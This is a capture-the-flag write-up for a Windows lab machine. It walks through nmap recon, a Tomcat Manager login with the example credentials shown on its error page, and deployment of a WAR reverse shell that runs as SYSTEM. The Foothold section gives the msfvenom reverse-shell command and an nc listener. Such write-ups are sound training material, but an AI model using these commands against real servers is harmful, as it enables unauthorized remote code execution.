# Jerry — Easy — Windows

**Date:** 11 June 2026

---

## Tags
`#windows` `#web` `#tomcat` `#default-creds` `#war-shell` `#msfvenom`

---

## What I Know

| Item            | Detail                                                  |
| --------------- | ------------------------------------------------------- |
| Target          | 10.129.136.9                                            |
| OS              | Windows                                                 |
| Open ports      | 8080 (HTTP)                                             |
| Service         | Apache Tomcat 7.0.88 (Coyote JSP engine 1.1)            |
| Foothold        | Tomcat Manager via default/example creds → WAR deploy   |
| Shell context   | `nt authority\system` (no privesc required)             |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.136.9

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 12:17 +0100
Nmap scan report for 10.129.136.9
Host is up (0.027s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 44.53 seconds
```

<img width="867" height="277" alt="image" src="https://github.com/user-attachments/assets/5a3cf4f2-1219-4ba1-8251-b7f6aecadefe" />

```
nmap -sC -sV -p8080 10.129.136.9

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 12:18 +0100
Nmap scan report for 10.129.136.9
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.26 seconds
```

<img width="1229" height="396" alt="image" src="https://github.com/user-attachments/assets/96f48ef0-cabd-41c1-944c-7c6b92ed7d45" />

**What each port tells me:**
- **Port 8080 (HTTP)** — Apache Tomcat 7.0.88 is running. With only one port open, this is my sole entry point, so everything funnels through Tomcat.

---

## Enumeration Log

```
OBSERVATION: Port 8080 is open
WHAT IT TELLS ME: The server is hosting a web application
WHAT I AM GOING TO TRY: Navigate to the application and investigate it
WHY: To understand what the application does
RESULT: It's a default Apache Tomcat 7.0.88 landing page
WHAT NEXT:
- Try to reach the Tomcat Manager app (/manager/html), a deployed WAR there is a fast path to a shell
```

<img width="2100" height="498" alt="image" src="https://github.com/user-attachments/assets/847849c1-cffa-4cd1-b877-59ff968e2cc2" />

```
OBSERVATION: Logging in with incorrect creds returns the 401 page at /manager/html, which helpfully displays Tomcat's
example credentials
WHAT IT TELLS ME: I need valid Manager credentials either default creds or the example pair shown on the 401 page
WHAT I AM GOING TO TRY: Test common Tomcat default creds plus the example creds from the 401 page
WHY: Tomcat Manager is frequently left on default/example credentials
RESULT: The example credentials from the 401 page worked, I'm logged into Tomcat Manager
WHAT NEXT: Use the Manager's deploy feature to upload a malicious WAR and get a reverse shell
```

<img width="1401" height="569" alt="image" src="https://github.com/user-attachments/assets/2ce7bac0-4f9d-47d5-8585-0417285f3a64" />

<img width="2036" height="1109" alt="image" src="https://github.com/user-attachments/assets/835eb8e7-4236-451e-ad61-eacd96311d50" />

```
OBSERVATION: Generated a WAR reverse-shell payload with msfvenom, deployed it via Tomcat Manager, and triggered it
WHAT IT TELLS ME: The shell came back as nt authority\system, the highest-privilege account on Windows
RESULT: Because Tomcat was running as SYSTEM, the shell is already fully privileged.
I could read both user.txt and root.txt directly from the Administrator's Desktop, no privesc needed.
```

<img width="1250" height="149" alt="image" src="https://github.com/user-attachments/assets/e8d57a38-de48-446e-baf4-aff1776c5520" />

<img width="832" height="199" alt="image" src="https://github.com/user-attachments/assets/f7e0ce92-f976-40b1-90db-4359e2d14159" />

<img width="608" height="86" alt="image" src="https://github.com/user-attachments/assets/f740c261-963d-4b0f-b8ef-ba85bdcead7d" />


---

## Foothold

**How I got in:** The only service was Apache Tomcat 7.0.88. Its Manager application (`/manager/html`) was reachable, and the 401 page conveniently displayed Tomcat's example credentials, which had been left active. Logging in with those gave access to the Manager's deploy function, which accepts WAR files so I deployed a reverse-shell WAR and triggered it.

**Command / exploit used:**
```
# generate a WAR reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
# listener
nc -lnvp <LPORT>
# deploy shell.war through Tomcat Manager (/manager/html), then browse to the
# deployed app path to trigger the callback
```

**Why it worked:** Tomcat Manager was left on valid example credentials, and the Manager deploy feature is designed to run uploaded WAR applications turning "can log in" directly into "can run code." A WAR is just a packaged web app, so a malicious one executes as soon as it's deployed and requested.

---

## Privilege Escalation

**Path taken:** None required. The Tomcat service was running as `nt authority\system`, so the reverse shell was already the most privileged account on the box. I read both flags from the Administrator's Desktop without any further escalation.

**Why it worked:** Running a network-facing service (Tomcat) as SYSTEM means any code execution through that service is instantly SYSTEM-level. The misconfiguration that gave the foothold (default Manager creds) and the one that gave full control (service running as SYSTEM) are the same compromise, there was no second step to take.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Logged into Tomcat Manager with the example credentials shown on its own 401 page, then deployed an msfvenom WAR reverse shell.
2. **Privesc technique in one sentence:** Not applicable Tomcat ran as `nt authority\system`, so the foothold shell was already fully privileged.
